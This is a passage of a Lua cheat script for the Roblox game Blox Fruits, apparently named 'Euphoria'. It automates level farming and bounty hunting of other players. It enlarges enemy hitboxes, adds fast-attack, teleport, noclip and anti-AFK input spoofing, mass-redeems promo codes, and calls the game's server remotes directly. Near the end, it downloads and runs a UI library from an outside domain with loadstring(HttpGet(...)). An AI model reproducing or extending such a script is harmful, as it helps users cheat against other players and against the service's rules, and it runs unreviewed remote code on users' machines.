                        game:service('VirtualInputManager'):SendKeyEvent(false, currSkill, false, game)
                        wait(.5)
                        return true
                    end
                    return false
                end
            end
        end

        function isAbleToKillBounty(enemy)
            if LP.Name == enemy.Name then return false end
            if LP.Team.Name == "Marines" then
                if enemy.Team == LP.Team then return false end
            end
            if enemy.Character:FindFirstChild("TempSafeZone") then return false end
            if enemy.Neutral then return false end
            if enemy.Data.Level.Value < 20 then
                return false
            end
            if LP.Data.Level.Value - enemy.Data.Level.Value > 500 then
                return false
            end
            if enemy.Data.Level.Value - LP.Data.Level.Value > 500 then
                return false
            end
            if enemy.Data.DevilFruit.Value == 'Buddha-Buddha' or enemy.Data.DevilFruit.Value == 'Dough-Dough' or enemy.Data.DevilFruit.Value == 'Kitsune-Kitsune' then
                return false
            end            
            return true
        end

        function isAbleToKill(enemy)
            if enemy.Data.Level.Value < 20 then
                return false
            end
            if enemy.Data.Level.Value > LP.Data.Level.Value + 500 then
                return false
            end
            if enemy.Data.DevilFruit.Value == 'Buddha-Buddha' or enemy.Data.DevilFruit.Value == 'Dough-Dough' or enemy.Data.DevilFruit.Value == 'Kitsune-Kitsune' then
                return false
            end
            if (enemy.Data.Stats.Defense.Level.Value - (LP.Data.Stats.Melee.Level.Value * 4)) - 300 > LP.Data.Stats.Melee.Level.Value * 10 + 400 then
                return false
            end
            
            return true
        end
        skipcount = 0
        -- KAITUN
        -- ============================
        task.spawn(function()
            while task.wait() do
                st, err = pcall(function()
                    local MyLevel = LP.Data.Level.Value
                    local QuestC = LP.PlayerGui.Main.Quest
                    local Quest = QuestCheck()

                    if skipcount > 40 then
                        HopServer()
                    end
                    
                    if _G.AutoFarmLevel then
                        if first_sea then
                            if QuestC.Visible == true then
                                if isPlayerHunterQuest(LP.PlayerGui.Main.Quest) then
                                    target = nil
                                    for i, plr in pairs(Players:GetChildren()) do
                                        if target then break end
                                        if string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, plr.Name) then
                                            target = plr
                                        end
                                    end
                                    if not target then 
                                        skipcount = skipcount + 1
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("AbandonQuest") 
                                    end
                                    if not isAbleToKill(target) then
                                        skipcount = skipcount + 1
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("AbandonQuest") 
                                    end
                                    done = false
                                    repeat task.wait()
                                        if not target.Character:FindFirstChild("HumanoidRootPart") then done = true end
                                        if getDistance(target.Character.HumanoidRootPart.CFrame) > 4000 then
                                            if useNearestEntrance(target.Character.HumanoidRootPart.CFrame) then
                                                StopTween()
                                            end
                                            task.wait(.2)
                                            if getDistance(target.Character.HumanoidRootPart.CFrame) > 10000 then
                                                Bypass(target.Character.HumanoidRootPart.CFrame)
                                            end
                                            if getDistance(target.Character.HumanoidRootPart.CFrame) > 4000 then
                                                repeat task.wait()
                                                    if useNearestEntrance(target.Character.HumanoidRootPart.CFrame) then
                                                        StopTween()
                                                    end
                                                    toTarget(target.Character.HumanoidRootPart.CFrame)
                                                until getDistance(target.Character.HumanoidRootPart.CFrame) < 100 or getDistance(target.Character.HumanoidRootPart.CFrame) > 1500 or not LP.PlayerGui.Main.Quest.Visible
                                                StopTween()
                                            end
                                        end
                                        _G.KillingPlayer = true
                                        if LP.PlayerGui.Main.PvpDisabled.Visible == true then
                                            repeat task.wait() until LP.Character.Humanoid.Health > 0
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("EnablePvp")
                                            toTarget(LP.Character.HumanoidRootPart.CFrame)
                                        end
                                        char = target.Character
                                        
                                        if char then
                                            if char:FindFirstChild("HumanoidRootPart") then
                                                if getDistance(char.HumanoidRootPart.CFrame) <= 50 then
                                                    AttackSkill(target, nil)
                                                end
                                                PosMon = char.HumanoidRootPart.CFrame
                                                BringMobFarm = false
                                                EquipWeapon(_G.SelectWeapon)
                                                char.HumanoidRootPart.Transparency = 1
                                                if useNearestEntrance(char.HumanoidRootPart.CFrame * CFrame.new(2, 1, 0)) then
                                                    StopTween()
                                                end
                                                toTarget(char.HumanoidRootPart.CFrame * CFrame.new(2, 1, 0))
                                            end
                                        end
                                    until not char or not char:FindFirstChild("Parent") or not char:FindFirstChild("Humanoid") or char.Humanoid.Health <= 0 or LP.PlayerGui.Main.Quest.Visible == false or not char:FindFirstChild("HumanoidRootPart") or done == true
                                    _G.KillingPlayer = false
                                    _G.AimbotPos = nil
                                else
                                    if not string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, Quest.QuestNPCName) then
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("AbandonQuest")
                                    end
                                    if not questStarted then
                                        if useNearestEntrance(Quest.QuestGiverPosition) then
                                            StopTween()
                                        end
                                        task.wait(.2)
                                        if getDistance(Quest.QuestGiverPosition) > 10000 then
                                            if not useNearestEntrance(Quest.QuestGiverPosition) then
                                                Bypass(Quest.QuestGiverPosition)
                                            end
                                            task.wait(.2)
                                        end
                                        if getDistance(Quest.QuestGiverPosition) > 4000 then
                                            repeat wait()
                                                if useNearestEntrance(Quest.QuestGiverPosition) then
                                                    StopTween()
                                                end
                                                toTarget(Quest.QuestGiverPosition)
                                            until getDistance(Quest.QuestGiverPosition) < 10 or not _G.AutoFarmLevel
                                        end
                                        
                                    end
                                    if workspace.Enemies:FindFirstChild(Quest.NPCName) then
                                        for i,v in pairs(workspace.Enemies:GetChildren()) do
                                            if v.Name == Quest.NPCName then
                                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                                    repeat task.wait()
                                                        if not string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, Quest.QuestNPCName) then
                                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("AbandonQuest")
                                                        else
                                                            status, err = pcall(function()
                                                                questStarted = true
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                                v.HumanoidRootPart.CanCollide = false
                                                                v.Humanoid.WalkSpeed = 0
                                                                v.Head.CanCollide = false
                                                                BringMobFarm = true
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                EquipWeapon(_G.SelectWeapon)
                                                                v.HumanoidRootPart.Transparency = 1
                                                                if useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                                    StopTween()
                                                                end
                                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            end)
                                                            if err then print(err, '2584') end
                                                        end
                                                    until not v.Parent or not v:FindFirstChild("Humanoid") or v.Humanoid.Health <= 0 or QuestC.Visible == false or not v:FindFirstChild("HumanoidRootPart")
                                                end
                                            end
                                        end
                                    else
                                        if getDistance(Quest.NPCPosition * OffsetCFrame()) > 1000 then
                                            if useNearestEntrance(Quest.NPCPosition * OffsetCFrame()) then
                                                StopTween()
                                            end
                                        end
                                        toTarget(Quest.NPCPosition * OffsetCFrame())
                                        if (Quest.NPCPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 50 then
                                            wait(0.5)
                                        end
                                    end
                                end
                            else
                                if MyLevel < 10 then
                                    game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer("StartQuest", Quest.QuestName, Quest.QuestLevel)
                                    toTarget(Quest.NPCPosition * OffsetCFrame())
                                end

                                if MyLevel >= 10 then
                                    if MyLevel < 300 then
                                        if MyLevel > 20 then
                                            if string.find(ReplicatedStorage.Remotes.CommF_:InvokeServer("PlayerHunter"), "We heard") then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("EnablePvp")
                                            else
                                                farmSkyGuards()
                                            end
                                        else
                                            farmSkyGuards()
                                        end
                                    end
                                end

                                if MyLevel < 700 and MyLevel >= 300 then
                                    if MyLevel < 690 then
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("EnablePvp")
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("PlayerHunter")
                                        wait(.5)
                                    end
                                    if LP.PlayerGui.Main.Quest.Visible == false then
                                        if (Quest.QuestGiverPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude >= 3000 then
                                            questStarted = false
                                            useNearestEntrance(Quest.QuestGiverPosition)
                                            task.wait(.2)
                                            if getDistance(Quest.QuestGiverPosition) > 10000 then
                                                Bypass(Quest.QuestGiverPosition)
                                                task.wait(.2)
                                                if getDistance(Quest.QuestGiverPosition) > 4000 then
                                                    repeat wait()
                                                        toTarget(Quest.QuestGiverPosition)
                                                    until getDistance(Quest.QuestGiverPosition) < 10
                                                end
                                            end
                                        else
                                            repeat wait() toTarget(Quest.QuestGiverPosition) until (Quest.QuestGiverPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 60
                                        end
                                        repeat wait() toTarget(Quest.QuestGiverPosition) until (Quest.QuestGiverPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 60
                                        if (Quest.QuestGiverPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 40 then
                                            BringMobFarm = true
                                            wait(0.2)
                                            game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer("StartQuest", Quest.QuestName, Quest.QuestLevel) wait(0.5)
                                            toTarget(Quest.NPCPosition * OffsetCFrame())
                                        end
                                    end
                                end 
                            end
                        elseif second_sea or third_sea then
                            if second_sea and LP.Data.Level.Value >= 1500 and (not _G.MaxLevel or _G.MaxLevel > 1500) then
                                AutoSea3 = true
                            else
                                if QuestC.Visible == true then
                                    if not questStarted then
                                        useNearestEntrance(Quest.QuestGiverPosition)
                                        task.wait(.2)
                                        if getDistance(Quest.QuestGiverPosition) > 10000 then
                                            if not useNearestEntrance(Quest.QuestGiverPosition) then
                                                Bypass(Quest.QuestGiverPosition)
                                            end
                                            task.wait(.2)
                                            if getDistance(Quest.QuestGiverPosition) > 4000 then
                                                repeat wait()
                                                    if useNearestEntrance(Quest.QuestGiverPosition) then
                                                        StopTween()
                                                    end
                                                    toTarget(Quest.QuestGiverPosition)
                                                until getDistance(Quest.QuestGiverPosition) < 10 or not _G.AutoFarmLevel
                                            end
                                        end
                                    end
                                    if workspace.Enemies:FindFirstChild(Quest.NPCName) then
                                        for i,v in pairs(workspace.Enemies:GetChildren()) do
                                            if v.Name == Quest.NPCName then
                                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                                    repeat task.wait()
                                                        if not string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, Quest.QuestNPCName) then
                                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("AbandonQuest")
                                                        else
                                                            status, err = pcall(function()
                                                                questStarted = true
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                                v.HumanoidRootPart.CanCollide = false
                                                                v.Humanoid.WalkSpeed = 0
                                                                v.Head.CanCollide = false
                                                                BringMobFarm = true
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                EquipWeapon(_G.SelectWeapon)
                                                                v.HumanoidRootPart.Transparency = 1
                                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            end)
                                                            if err then print(err, '2584') end
                                                        end
                                                    until not v.Parent or not v:FindFirstChild("Humanoid") or v.Humanoid.Health <= 0 or QuestC.Visible == false or not v:FindFirstChild("HumanoidRootPart")
                                                end
                                            end
                                        end
                                    else
                                        if getDistance(Quest.NPCPosition * OffsetCFrame()) > 1000 then
                                            if useNearestEntrance(Quest.NPCPosition * OffsetCFrame()) then
                                                StopTween()
                                            end
                                        end
                                        toTarget(Quest.NPCPosition * OffsetCFrame())
                                        if (Quest.NPCPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 50 then
                                            wait(0.5)
                                        end
                                    end
                                else
                                    if LP.PlayerGui.Main.Quest.Visible == false then
                                        questStarted = false
                                        if (Quest.QuestGiverPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude >= 3000 then
                                            useNearestEntrance(Quest.QuestGiverPosition)
                                            wait(.2)
                                            if getDistance(Quest.QuestGiverPosition) > 2000 then
                                                Bypass(Quest.QuestGiverPosition)
                                                wait(.2)
                                                if getDistance(Quest.QuestGiverPosition) > 2000 then
                                                    repeat wait()
                                                        tf = toTarget(Quest.QuestGiverPosition)
                                                    until getDistance(Quest.QuestGiverPosition) < 10
                                                end
                                            end
                                        else
                                            repeat wait() toTarget(Quest.QuestGiverPosition) until (Quest.QuestGiverPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 60
                                        end
                                        if (Quest.QuestGiverPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 40 then
                                            BringMobFarm = true
                                            wait(0.2)
                                            game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer("StartQuest", Quest.QuestName, Quest.QuestLevel) wait(0.5)
                                            toTarget(Quest.NPCPosition * OffsetCFrame())
                                        end
                                    end
                                end
                            end
                            
                        end
                    end 
                end)
                if err then print(err, 'line 2725') end
            end
        end)

        local function learnNeededStat()
            local plr = LP
            local Melee = plr.Data.Stats.Melee.Level.Value
            local Defense = plr.Data.Stats.Defense.Level.Value
            local Sword = plr.Data.Stats.Sword.Level.Value
            
            if plr.Data.Points.Value == 0 then return end

            if Melee < 2550 then
                local args = {
                    [1] = "AddPoint",
                    [2] = "Melee",
                    [3] = 2550 - Melee
                }
                ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
            elseif Defense < 2550 then
                local args = {
                    [1] = "AddPoint",
                    [2] = "Defense",
                    [3] = 2550 - Defense
                }
                ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
            elseif Sword < 2550 then
                local args = {
                    [1] = "AddPoint",
                    [2] = "Sword",
                    [3] = 2550 - Sword
                }
                ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
            end
        end

        spawn(function()
            while wait() do
                if _G.AutoFarmLevel then
                    learnNeededStat()
                end
            end
        end)

        spawn(function()
            while wait() do
                st, err = pcall(function()
                    if _G.AutoFarmLevel and isItemInEquip("Combat") and LP.Data.Beli.Value >= 150000 then
                        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyBlackLeg")
                    end
                    wait(40)
                end)
            end
        end)

        spawn(function()
            while wait() do
                if first_sea then
                    if game.ReplicatedStorage.Remotes.CommF_:InvokeServer("DressrosaQuestProgress", "Dressrosa") == 0 then return end
                    if _G.AutoFarmLevel or _G.DoSecondSea then
                        if LP.Data.Level.Value >= 700 and game.ReplicatedStorage.Remotes.CommF_:InvokeServer("DressrosaQuestProgress", "Dressrosa") ~= 0 then
                            doSecondSea()
                        end
                    end
                end
            end
        end)

        local function redeemcodes()
            local redeem = function(code)
                local args = {
                    [1] = code
                }
                ReplicatedStorage.Remotes.Redeem:InvokeServer(unpack(args))
            end
            redeem("SUB2GAMERROBOT_RESET1")
            redeem("Sub2UncleKizaru")
            redeem("ADMINHACKED")
            local function isExpActive()
                if string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Level.Exp.Text, "2x ends") then
                    return true
                else
                    return false
                end
            end
            if not isExpActive() then
                redeem("NOOB2ADMIN")
            end
            wait(1)
            if not isExpActive() then
                redeem("CODESLIDE")
            end
            wait(1)
            if not isExpActive() then
                redeem("Sub2Fer999")
            end
            wait(1)
            if not isExpActive() then
                redeem("Enyu_is_Pro")
            end
            wait(1)
            if not isExpActive() then
                redeem("Magicbus")
            end
            wait(1)
            if not isExpActive() then
                redeem("JCWK")
            end
            wait(1)
            if not isExpActive() then
                redeem("Starcodeheo")
            end
            wait(1)
            if not isExpActive() then
                redeem("Bluxxy")
            end
            wait(1)
            if not isExpActive() then
                redeem("fudd10_v2")
            end
            wait(1)
            if not isExpActive() then
                redeem("THEGREATACE")
            end
            wait(1)
            if not isExpActive() then
                redeem("TantaiGaming")
            end
            wait(1)
            if not isExpActive() then
                redeem("Axiore")
            end
            wait(1)
            if not isExpActive() then
                redeem("Sub2OfficialNoobie")
            end
            wait(1)
            if not isExpActive() then
                redeem("StrawHatMaine")
            end
            wait(1)
            if not isExpActive() then
                redeem("SUB2GAMERROBOT_EXP1")
            end
            wait(1)
        end

        spawn(function()
            while wait() do
                if _G.AutoFarmLevel then
                    if LP.Data.Level.Value >= 10 then
                        redeemcodes()
                        wait(50)
                    end
                end
            end
        end)

        function countNearestEnemies()
            count = 0
            for i,v in pairs(Enemies:GetChildren()) do
                if getDistance(v.HumanoidRootPart.CFrame) < 200 then
                    count = count + 1
                end
            end
            return count
        end
        
        coroutine.wrap(function()
            while task.wait(_G.FastSpeed) do
                pcall(function()
                    local ac = CombatFrameworkR.activeController
                    if ac and ac.equipped then
                        if _G.FastAttack and not _G.DisableFastAttack then
                            status, err = pcall(function() AttackFunction() end)
                        else
                            if ac.hitboxMagnitude ~= 55 then
                                ac.hitboxMagnitude = 55
                            end
                            ac:attack()
                        end
                    end
                end)
            end
        end)()
        

        spawn(function()
            while wait() do
                if not LP.Character:FindFirstChild("HasBuso") then
                    ReplicatedStorage.Remotes.CommF_:InvokeServer("Buso")
                end
            end 
        end)
        
        spawn(function()
            while wait() do
                wait(200)
                if _G.AntiAFK then
                    local VirtualUser=game:GetService('VirtualUser')
                    VirtualUser:CaptureController()
                    VirtualUser:ClickButton2(Vector2.new())
                    game:GetService("VirtualInputManager"):SendMouseButtonEvent(1,1,0,true,nil,0)
                    game:GetService("VirtualInputManager"):SendMouseButtonEvent(1,1,0,false,nil,0) 
                end
            end
        end)
        
        spawn(function()
            while wait() do
                if _G.LearnMelee then
                    local args = {
                        [1] = "AddPoint",
                        [2] = "Melee",
                        [3] = _G.LearnRate
                    }
                    ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                end
                if _G.LearnDefense then
                    local args = {
                        [1] = "AddPoint",
                        [2] = "Defense",
                        [3] = _G.LearnRate
                    }
                    ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                end
                if _G.LearnSword then
                    local args = {
                        [1] = "AddPoint",
                        [2] = "Sword",
                        [3] = _G.LearnRate
                    }
                    ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                end
                if _G.LearnGun then
                    local args = {
                        [1] = "AddPoint",
                        [2] = "Gun",
                        [3] = _G.LearnRate
                    }
                    ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                end
                if _G.LearnFruit then
                    local args = {
                        [1] = "AddPoint",
                        [2] = "Demon Fruit",
                        [3] = _G.LearnRate
                    }
                    ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                end
                
            end
        end)
    
        local function getFruitWorth(fruitName)
            worth = {
                ["Quake Fruit"] = 1000000,
                ["Buddha Fruit"] = 1200000,
                ["Love Fruit"] = 1300000,
                ["Spider Fruit"] = 1500000,
                ["Sound Fruit"] = 1700000,
                ["Phoenix Fruit"] = 1800000,
                ["Portal Fruit"] = 1900000,
                ["Rumble Fruit"] = 2100000,
                ["Pain Fruit"] = 2300000,
                ["Blizzard Fruit"] = 2400000,
                ["Gravity Fruit"] = 2500000,
                ["Mammoth Fruit"] = 2700000,
                ["T-Rex Fruit"] = 2700000,
                ["Dough Fruit"] = 2800000,
                ["Shadow Fruit"] = 2900000,
                ["Venom Fruit"] = 3000000,
                ["Control Fruit"] = 3200000,
                ["Spirit Fruit"] = 3400000,
                ["Dragon Fruit"] = 3500000,
                ["Leopard Fruit"] = 5000000,
                ["Kitsune Fruit"] = 8000000,
            }
            return worth[fruitName] or 0
        end
        
        local function isFruitsOnServer() 
            for i,v in pairs(game.Workspace:GetChildren()) do
                if v.Name ~= 'Blox Fruit Dealer' then
                    if string.find(v.Name, 'Fruit') then
                        return true
                    end
                end
            end
            return false
        end
        
        local function findNearestFruit()
            local fruit = nil
            local dis = math.huge
            for i,v in pairs(game.Workspace:GetChildren()) do
                if v.Name ~= 'Blox Fruit Dealer' then
                    if string.find(v.Name, ' Fruit') or v:FindFirstChild("Fruit") then
                        if getDistance(v:GetPivot()) < dis then
                            fruit = v
                            dis = getDistance(v:GetPivot())
                        end
                    end
                end
            end
            return fruit
        end

        local function takeFruits()
            for i,v in pairs(game.Workspace:GetChildren()) do
                touched = false
                if v.Name ~= 'Blox Fruit Dealer' then
                    if string.find(v.Name, ' Fruit') or v:FindFirstChild("Fruit") then
                        repeat wait()
                            LP.Character.HumanoidRootPart.CFrame = v.Handle.CFrame
                            -- if v.Handle:FindFirstChild("TouchInterest") and not touched then
                            --     touched = true
                            --     firetouchinterest(LP.Character.HumanoidRootPart, v.Handle.TouchInterest, 0) 
                            -- end
                            game:service('VirtualInputManager'):SendKeyEvent(true, "W", false, game)
                            game:service('VirtualInputManager'):SendKeyEvent(false, "W", false, game)
                            game:service('VirtualInputManager'):SendKeyEvent(true, "A", false, game)
                            game:service('VirtualInputManager'):SendKeyEvent(false, "A", false, game)
                        until not v or not v.Parent or v.Parent.Name ~= 'Workspace'
                    end
                end
            end
        end
        
        local function storeFruit(fruitName, fruitRealName) 
            repeat wait()
                if LP.Character:FindFirstChild(fruitName) then
                    local args = {
                        [1] = "StoreFruit",
                        [2] = fruitRealName,
                        [3] = LP.Character:FindFirstChild(fruitName)
                    }
                    ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                elseif LP.Backpack:FindFirstChild(fruitName) then
                    local args = {
                        [1] = "StoreFruit",
                        [2] = fruitRealName,
                        [3] = LP.Backpack:FindFirstChild(fruitName)
                    }
                    ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                else return end
            until not isItemInEquip(fruitName)
        end
        
        function isFruitInBackpack(OriginalName)
            for i,v in pairs(ReplicatedStorage.Remotes["CommF_"]:InvokeServer("getInventoryFruits")) do
                if OriginalName == v.Name then return true end
            end
            return false
        end

        local function storeAllWorthFruits()
            for i,v in pairs(LP.Backpack:GetChildren()) do 
                if string.find(v.Name, ' Fruit') and not isFruitInBackpack(v:GetAttribute("OriginalName")) then
                    if getFruitWorth(v.Name) >= 1000000 then
                        print("Storing", v.Name)
                        pcall(function() storeFruit(v.Name, v:GetAttribute("OriginalName")) end)
                    end
                end
            end
            for i,v in pairs(LP.Character:GetChildren()) do 
                if string.find(v.Name, ' Fruit') and not isFruitInBackpack(v:GetAttribute("OriginalName")) then
                    if getFruitWorth(v.Name) >= 1000000 then
                        print("Storing", v.Name)
                        pcall(function() storeFruit(v.Name, v:GetAttribute("OriginalName")) end)
                    end
                end
            end
            return true
        end

        local function storeAllFruits()
            for i,v in pairs(LP.Backpack:GetChildren()) do 
                if string.find(v.Name, ' Fruit') and not isFruitInBackpack(v:GetAttribute("OriginalName")) then
                    print("Storing", v.Name)
                    pcall(function() storeFruit(v.Name, v:GetAttribute("OriginalName")) end)
                end
            end
            for i,v in pairs(LP.Character:GetChildren()) do 
                if string.find(v.Name, ' Fruit') and not isFruitInBackpack(v:GetAttribute("OriginalName")) then
                    print("Storing", v.Name)
                    LP.Character.Humanoid:EquipTool(v)
                    pcall(function() storeFruit(v.Name, v:GetAttribute("OriginalName")) end)
                end
            end
        end
        
        local function isCheapFruitsInInventory()
            for i,v in pairs(LP.Backpack:GetChildren()) do 
                if string.find(v.Name, ' Fruit') then
                    if getFruitWorth(v.Name) < 1000000 then 
                        return true 
                    end
                end
            end
            for i,v in pairs(LP.Character:GetChildren()) do 
                if string.find(v.Name, ' Fruit') then
                    if getFruitWorth(v.Name) < 1000000 then
                        return true 
                    end
                end
            end
            for i,v in pairs(ReplicatedStorage.Remotes["CommF_"]:InvokeServer("getInventoryFruits")) do
                if string.find(v.Name,"T-Rex") then
                    if getFruitWorth("T-Rex Fruit") < 1000000 then
                        return true
                    end
                else
                    if getFruitWorth(string.split(v.Name, '-')[1] .. " Fruit") < 1000000 then
                        return true 
                    end
                end
            end
            return false
        end

        local function isChipInInventory()
            for i,v in pairs(LP.Backpack:GetChildren()) do 
                if string.find(v.Name, 'Microchip') then
                    return true
                end
            end
            for i,v in pairs(LP.Character:GetChildren()) do 
                if string.find(v.Name, 'Microchip') then
                    return true
                end
            end
        end

        local function isRaiding()
            if LP:GetAttribute("IslandRaiding") then
                return true
            else
                return false
            end
        end

        local function isWorthFruitInInventory()
            for i,v in pairs(LP.Backpack:GetChildren()) do 
                if string.find(v.Name, ' Fruit') then
                    if getFruitWorth(v.Name) >= 1000000 then return true end
                end
            end
            for i,v in pairs(LP.Character:GetChildren()) do 
                if string.find(v.Name, ' Fruit') then
                    if getFruitWorth(v.Name) >= 1000000 then return true end
                end
            end
            return false
        end
        
        
        local function isFruitsInInventory()
            for i,v in pairs(LP.Backpack:GetChildren()) do 
                if string.find(v.Name, ' Fruit') then
                    return true
                end
            end
            for i,v in pairs(LP.Character:GetChildren()) do 
                if string.find(v.Name, ' Fruit') then
                    return true
                end
            end
            return false
        end
        
        function UnEquip()
            if LP.Character:FindFirstChildOfClass("Tool") then
                LP.Character:FindFirstChildOfClass("Tool").Parent = LP.Backpack
                return
            end
            for i,v in pairs(LP.Character:GetChildren()) do
                if v:FindFirstChild("firing") then 
                    LP.Character:FindFirstChild(v.Name).Parent = LP.Backpack
                end
            end
        end

        local libUrl = "https://deadcxde.xyz/scripts/lib/loadui.lua"
        local Library = loadstring(game:HttpGet(libUrl))()
        local Window = Library.CreateLib("Euphoria :)", "DarkTheme")
        
        spawn(function()
            while wait() do
                pcall(function()
                    if AutoTweenToTeammateCell or AutoFindSwordDealer or AutoSea3 or FarmLibraryKey or FarmWaterKey or _G.FarmBosses or _G.FarmGunMastery or FollowPlayerBoat or (AutoFindFrozenDimension and not isOnBoat()) or (AutoFindKitsuneIsland and not isOnBoat()) or (_G.AutoGearBoat and not isOnBoat()) or _G.AutoCyborgRaceSelf or _G.FarmDemonicWisp or _G.AutoCyborgRaceTeammate or _G.AutoGodhuman or (_G.AutoSharkAnchor and not isOnBoat()) or _G.AutoSoulReaper or (AutoSeaBeast and not isOnBoat()) or (AutoSeaBeastRaceV3 and not isOnBoat()) or _G.AutoFarmFruitsSafe or (AutoV3Race and not AutoSeaBeastRaceV3) or _G.FarmFangs or _G.FarmWeaponMastery or _G.FarmFruitMastery or _G.FarmBounty or _G.AutoV2Race or _G.KillingOrder or _G.KillIndra or _G.FarmDragonScale or _G.AutoPole1st or _G.FarmCocoa or _G.AutoCanvander or _G.AutoFarmLevel or _G.KillPlayer or _G.AutoFarmLevel or _G.AutoGear or _G.KillDough or AutoBartilo or _G.AutoSoulGuitar or _G.FarmDough or AutoCDK or _G.TweenToMirage or _G.TweenToGear or _G.DoSecondSea or FarmBones or FarmBonesCDK or _G.AutoHolyTorch or AutoYama or AutoTushita or FarmEctoplasm or getgenv().EuphoriaSettings["Auto Rengoku"] or getgenv().EuphoriaSettings["Swan Glasses"] or getgenv().EuphoriaSettings["Gravity Cane"] or getgenv().EuphoriaSettings["Auto Kill Darkbeard"] or getgenv().EuphoriaSettings["Auto Factory"] or getgenv().EuphoriaSettings["Auto Ghoul Race"] or _G.TweenToIsland or _G.TweenToNPC then 
                        NoClip = true 
                    else
                        NoClip = false 
                    end
                end)
            end
        end)

        local MainTab = Window:NewTab("Main")
        local InfoSection = MainTab:NewSection("Information")
        local MainFarmSection = MainTab:NewSection("Farm settings")
        timerLabel = InfoSection:NewLabel(" ")
        task.spawn(function()
            while task.wait(4) do
                pcall(function()
                    h=math.floor((math.floor(workspace.DistributedGameTime+0.5)/(60*60*1))%(24))
                    m=math.floor(math.floor(workspace.DistributedGameTime+0.5)/(60*1))%(60)
                    s=math.floor(math.floor(workspace.DistributedGameTime+0.5)/(1))%(60)
                    h=(string.len(h)==1 and "0"..h or h)
                    m=(string.len(m)==1 and "0"..m or m)
                    s=(string.len(s)==1 and "0"..s or s)
                    timerLabel:UpdateLabel("Online Time: "..h..":"..m..":"..s)
                end)
            end
        end)
        gameTime = InfoSection:NewLabel(" ")
        task.spawn(function()
            while task.wait(4) do
                pcall(function()
                    gameTime:UpdateLabel("Game Time: " .. game:GetService("Lighting").TimeOfDay)
                end)
            end
        end)
        currentMoon = InfoSection:NewLabel(" ")
        spawn(function()
            while wait() do
                pcall(function()
                    currentMoon:UpdateLabel("Moon Status: " .. getMoonPhase())
                end)
                wait(20)
            end
        end)
        InfoSection:NewLabel(" ")
        currentBounty = InfoSection:NewLabel("Bounty: ")
        spawn(function()
            while wait(2) do
                pcall(function()
                    currentBounty:UpdateLabel("Bounty: " .. tostring(LP.leaderstats["Bounty/Honor"].Value))
                end)
            end
        end)
        currentBeli = InfoSection:NewLabel("Beli: ")
        spawn(function()
            while wait(5) do
                pcall(function()
                    currentBeli:UpdateLabel("Beli: " .. tostring(LP.Data.Beli.Value))
                end)
            end
        end)
        currentFrag = InfoSection:NewLabel("Fragments: ")
        spawn(function()
            while wait(5) do
                pcall(function()
                    currentFrag:UpdateLabel("Fragments: " .. tostring(LP.Data.Fragments.Value))
                end)
            end
        end)

        InfoSection:NewLabel("")
        MainFarmSection:NewSlider("Atk Speed Delay", 0, 300, function(count)
            _G.FastSpeed = count / 100
        end)
        spawn(function()
            while wait(1) do
                pcall(function()
                    if _G.FastSpeed then
                        getgenv().EuphoriaSettings['Fast Speed'] = _G.FastSpeed
                        WriteSettings()
                    end
                end)
            end
        end)

        _G.FastSpeed = getgenv().EuphoriaSettings['Fast Speed'] or 0.2

        autoFarmLevel = MainFarmSection:NewToggle("Auto Farm Level", function(state)
            _G.AutoFarmLevel = state
            getgenv().EuphoriaSettings['Auto Farm Level'] = state
            WriteSettings()
        end)
        if _G.AutoFarmLevel or getgenv().EuphoriaSettings['Auto Farm Level'] then autoFarmLevel:UpdateToggle(nil, true) end
        
        MaxLevelDropdown = MainFarmSection:NewDropdown("Max Level", {"0", "700", "1500", "5000"}, function(choice)
            getgenv().EuphoriaSettings['Max Level'] = tonumber(choice)
            WriteSettings()
        end)
